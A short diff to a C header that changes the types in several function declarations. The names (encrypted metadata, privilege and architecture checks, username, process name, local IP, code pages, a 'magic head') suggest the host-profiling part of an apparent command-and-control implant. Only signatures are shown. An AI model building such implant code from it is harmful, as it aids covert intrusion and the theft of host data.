@@ -17,18 +17,17 @@ typedef struct {
     DWORD EncryMetadataLen;
 } EncryMetadataResult;
 
-
 MakeMetaInfoResult MakeMetaInfo();
 EncryMetadataResult EncryMetadata();
-bool IsHighPriv();
-bool IsOSX64();
-bool IsProcessX64();
-int  GetMetaDataFlag();
+BOOL IsHighPriv();
+BOOL IsOSX64();
+BOOL IsProcessX64();
+uint32_t  GetMetaDataFlag();
 unsigned char* GetOSVersion();
 uint32_t GetLocalIPInt();
-char* GetComputerNameAsString();
-char* GetUsername();
-char* GetProcessName();
+unsigned char* GetComputerNameAsString();
+unsigned char* GetUsername();
+unsigned char* GetProcessName();
 unsigned char* GetCodePageANSI(size_t* bytesWritten);
 unsigned char* GetCodePageOEM(size_t* bytesWritten);
 uint8_t* GetMagicHead(uint8_t* MagicHead);
